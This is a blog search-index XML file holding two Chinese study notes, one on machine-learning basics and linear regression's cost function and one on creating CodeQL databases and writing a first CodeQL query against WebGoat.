<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>机器学习笔记</title>
      <link href="/2025/02/24/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/02/24/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="机器学习">机器学习</h2><p>机器学习（Machine Learning）是人工智能的一个分支，简单来说，它让计算机通过数据自己“学习”规律并做出预测或决策，而不需要人类明确地编写每一步规则。它有点像教小孩认识世界：你给它很多例子，它通过观察和总结找出模式，以后遇到类似情况就能自己判断。</p><p>具体点，机器学习的核心是用算法从数据中提取特征、建立模型，然后用这个模型去解决实际问题。比如，你想让机器识别手写数字，可以给它看几千张写着0到9的图片，告诉它每个是什么（或者不告诉，让它自己分组），它就会慢慢学会分辨。</p><p>机器学习主要分三种类型：<strong>监督学习</strong>（有标签数据，像教答案）、<strong>无监督学习</strong>（无标签，自己找规律）和<strong>强化学习</strong>（通过试错学怎么做最好）。</p><p>它在生活中无处不在，比如推荐你喜欢的电影、过滤垃圾邮件、自动驾驶识别路况，甚至帮医生看X光片。关键在于，它靠的是数据和算法，而不是传统的“如果这样就那样”的硬编码规则。所以数据越多、算法越聪明，它就越厉害。</p><h2 id="监督学习和无监督学习">监督学习和无监督学习</h2><p>监督学习和无监督学习是两种最基本的方法，它们的主要区别在于<strong>数据是否带有标签</strong></p><h3 id="监督学习">监督学习</h3><p>监督学习（Supervised Learning）就像有一个老师在旁边指导。它的核心是<strong>用已经标记好的数据来训练模型</strong>，也就是说，<strong>数据里不仅有输入（特征），还有对应的正确输出（标签）</strong>。比如，你要教模型识别猫狗的图片，训练数据里每张图片都会标注“这是猫”或“这是狗”。模型通过学习这些例子，找到输入和输出之间的规律，以后看到新图片就能自己判断是猫还是狗。常见的监督学习任务包括<strong>分类()</strong>（比如判断邮件是不是垃圾邮件）和<strong>回归()</strong>（比如预测房价）</p><h3 id="无监督学习">无监督学习</h3><p>无监督学习（Unsupervised Learning）则没有这个“老师”。<strong>数据只有输入，没有预先给出的标签，模型得自己去挖掘数据的内在结构或模式</strong>。比如，你给一堆图片，模型可能会自己把它们分成几类，比如“看起来像动物的”和“看起来像风景的”，但它不知道这些类具体叫什么。无监督学习常用来做<strong>聚类(Clustering)</strong>（把相似的东西分一组）、<strong>降维(Dimensionality reduction)</strong>（把复杂数据简化但保留关键信息）或者<strong>异常检测(Anomaly detection)</strong>（发现异常的数据点），比如分析用户行为、压缩数据和金融系统中的欺诈检测。</p><h2 id="线性回归模型">线性回归模型</h2><p><strong>线性回归模型</strong>是一种基础且广泛使用的监督学习算法，主要用于预测连续的数值结果（即回归任务）。它的核心思想是<strong>通过输入特征（自变量）和输出目标（因变量）之间的线性关系，构建一个模型来进行预测</strong>。机器学习中的线性回归与统计学中的线性回归在数学上有很多相似之处，但侧重于预测性能和应用场景。</p><h3 id="成本函数-Cost-Function">成本函数(Cost Function)</h3><p>成本函数将告诉我们，模型的表现如何，以便使我们尝试使其变得更好。</p><p>成本函数公式如下：</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -2.819ex;" xmlns="http://www.w3.org/2000/svg" width="29.64ex" height="6.354ex" role="img" focusable="false" viewbox="0 -1562.5 13100.7 2808.5" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(633,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1022,0)"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1738,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(2182.7,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2611.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(3278.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mfrac" transform="translate(4334.2,0)"><g data-mml-node="mn" transform="translate(659,676)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mrow" transform="translate(220,-686)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g><rect width="1578" height="60" x="120" y="220"/></g><g data-mml-node="munderover" transform="translate(6318.9,0)"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(148.2,-1087.9) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g></g><g data-mml-node="TeXAtom" transform="translate(411.6,1150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="msup" transform="translate(7929.6,0)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(389,0)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(300.6,16) translate(-250 0)"><path data-c="5E" d="M112 560L249 694L257 686Q387 562 387 560L361 531Q359 532 303 581L250 627L195 580Q182 569 169 557T148 538L140 532Q138 530 125 546L112 560Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="TeXAtom" transform="translate(523,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(734,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(1978.3,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(2978.5,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(523,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(734,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(4345.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mn" transform="translate(4767.6,670.4) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mi>J</mi><mo stretchy="false">(</mo><mi>w</mi><mo>,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mn>2</mn><mi>m</mi></mrow></mfrac><munderover><mo data-mjx-texclass="OP">∑</mo><mrow data-mjx-texclass="ORD"><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow data-mjx-texclass="ORD"><mi>m</mi></mrow></munderover><msup><mrow data-mjx-texclass="ORD"><mo stretchy="false">(</mo><msup><mrow data-mjx-texclass="ORD"><mover><mi>y</mi><mo stretchy="false">^</mo></mover></mrow><mrow data-mjx-texclass="ORD"><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo>−</mo><msup><mi>y</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">)</mo></mrow><mn>2</mn></msup></math></mjx-assistive-mml></mjx-container>]]></content>
      
      
      <categories>
          
          <category> 联邦学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codeql查询语法笔记</title>
      <link href="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="生成数据库">生成数据库</h2><p>以下为各种语言创建数据库的命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">java</span></span><br><span class="line">codeql database create &quot;~/CodeQL/databases/code-database&quot; --source-root=&quot;~/CodeQL/projects/java-code&quot; --language=java --command=&quot;mvn clean install -file pom.xml&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Go</span></span><br><span class="line">codeql database create &quot;~/CodeQL/databases/code-database&quot; --source-root=&quot;~/CodeQL/projects/java-code&quot; --language=go</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Python</span></span><br><span class="line">codeql database create &quot;~/CodeQL/databases/code-database&quot; --source-root=&quot;~/CodeQL/databases/code-database&quot; --language=python</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">JavaScript</span></span><br><span class="line">codeql database create &quot;~/CodeQL/databases/code-database&quot; --source-root=&quot;~/CodeQL/databases/code-database&quot; --language=javascript</span><br></pre></td></tr></table></figure><p><code>CodeQL</code>不支持<code>PHP</code>，支持的编程语言类型，参考官网<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>。对于<code>Java</code>代码有些不同，需要进行代码的编译后<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>，才能生成相关的数据库。</p><p>编译过程中，若出现环境问题可使用<code>--verbose</code>输出详细的错误，进行错误的定位。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create webgoat-qldb -language= java --command &quot;./mvnw clean package -DskipTests&quot; --verbose</span><br></pre></td></tr></table></figure><p>对于<code>Java</code>代码的特殊性<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>，，实战中获取到的可能是编译后的<code>Java</code>代码，这里可以使用工具<code>CodeQLpy</code><sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup>，它可以对多种不同类型的java代码进行代码审计，包括jsp文件、SpringMVC的war包、SpringBoot的jar包、maven源代码。</p><h2 id="基础语法结构">基础语法结构</h2><p><code>Codeql</code>查询语法有点类似<code>SQL</code>查询，结构如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Query metadata</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">import <span class="comment">/* ... CodeQL libraries or modules ... */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... Optional, define CodeQL classes and predicates ... */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="comment">/* ... 变量声明 ... */</span></span><br><span class="line"><span class="keyword">where</span> <span class="comment">/* ... 逻辑处理 ... */</span></span><br><span class="line"><span class="keyword">select</span> <span class="comment">/* ... 表达式 ... */</span></span><br></pre></td></tr></table></figure><h2 id="编写第一个查询">编写第一个查询</h2><h3 id="创建第一个QL包">创建第一个QL包</h3><p>这里以<code>WebGoat</code><sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup>创建的数据库为查询对象。</p><p>创建一个文件夹，用来存放后续你编写的<code>CodeQL</code>脚本，<code>CodeQL</code>官方称这个文件夹为<code>QL Pack</code>。</p><p>例如名为<code>qltest</code>的文件夹，并在里面创建1个<code>QL Pack</code>的配置文件，名称固定为<code>qlpack.yml</code>。再创建一个ql后缀的文件，名称随意。</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250223211310603.png" alt="image-20250223211310603"></p><p><code>qlpack.yml</code>文件中写入以下内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">qltest</span></span><br><span class="line"><span class="attr">version:</span> <span class="number">0.0</span><span class="number">.0</span></span><br><span class="line"><span class="attr">libraryPathDependencies:</span> <span class="string">codeql-java</span></span><br></pre></td></tr></table></figure><ul><li><p>第一行表示这个QL包的名称为<code>qltest</code>，必选，如果你在VSCode中同时打开多个QL包时，要保证这个name的值唯一不重复。</p></li><li><p>第二行表示这个QL包的版本号，必选。</p></li><li><p>第三行表示这个QL包的依赖，必选，codeql-java表示需要Java语言的QL标准库依赖。</p></li></ul><p>在VSCode的CodeQL插件中添加用CodeQL创建的WebGoat的数据库</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250223210106772.png" alt="image-20250223210106772"></p><h3 id="编写查询">编写查询</h3><p>在<code>webgoat-query.ql</code>文件中编写如下代码，用来查找WebGoat项目中所有声明的方法。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="keyword">Method</span> m</span><br><span class="line"><span class="keyword">select</span> m</span><br></pre></td></tr></table></figure><p>然后右键点击<code>webgoat-query.ql</code>文件，点击【CodeQL: Run Query 】来执行本次查询，执行完成后在右边可以看到多出一列用来显示查询结果。</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250223211244232.png" alt="image-20250223211244232"></p><h2 id="QL语言参考">QL语言参考</h2><ul><li><a href="https://codeql.github.com/docs/ql-language-reference/about-the-ql-language/">关于 QL 语言</a>：QL 是 CodeQL 的强大查询语言，用于分析代码。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/predicates/">谓词</a>：谓词用于描述构成 QL 程序的逻辑关系。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/queries/">查询</a>：查询是 QL 程序的输出。他们评估结果集。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/types/">类型</a>：QL 是一种静态类型语言，因此每个变量都必须有一个声明的类型。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/modules/">模块</a>：模块提供了一种通过将相关类型、谓词和其他模块组合在一起来组织 QL 代码的方法。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/aliases/">别名</a>：别名是现有 QL 实体的替代名称。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/variables/">变量</a>：QL 中的变量与代数或逻辑中的变量的使用方式类似。它们代表一组值，这些值通常受公式限制。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/expressions/">表达式</a>：表达式计算为一组值并具有类型。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/formulas/">公式</a>：公式定义了表达式中使用的自由变量之间的逻辑关系。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/annotations/">注释</a>：注释是一个字符串，您可以将其直接放在 QL 实体或名称的声明之前。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/recursion/">递归</a>：QL 为递归提供了强大的支持。如果 QL 中的谓词直接或间接依赖于自身，则称其为递归谓词。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/lexical-syntax/">词法语法</a>：QL 语法包括不同种类的关键字、标识符和注释。</li><li><a 